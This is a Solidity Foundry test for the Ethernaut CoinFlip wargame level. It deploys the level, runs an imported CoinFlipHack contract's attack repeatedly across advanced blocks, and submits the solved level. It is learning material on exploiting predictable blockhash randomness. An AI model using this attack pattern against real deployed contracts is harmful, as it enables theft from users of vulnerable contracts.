pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/CoinFlip/CoinFlipHack.sol";
import "../src/CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";

contract CoinFlipTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Move the block from 0 to 5 to prevent underflow errors
        vm.roll(5);

        // Create coinFlipHack contract
        CoinFlipHack coinFlipHack = new CoinFlipHack(levelAddress);

        // Run the attack 10 times, iterate the block each time, function can only be called once per block
        for (uint256 i = 0; i <= 10; i++) {
            // Must be on latest version of foundry - blockhash was defaulting to 0 in earlier version of foundry resolved in this commit https://github.com/gakonst/foundry/pull/728
            vm.roll(6 + i);
            coinFlipHack.attack();
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
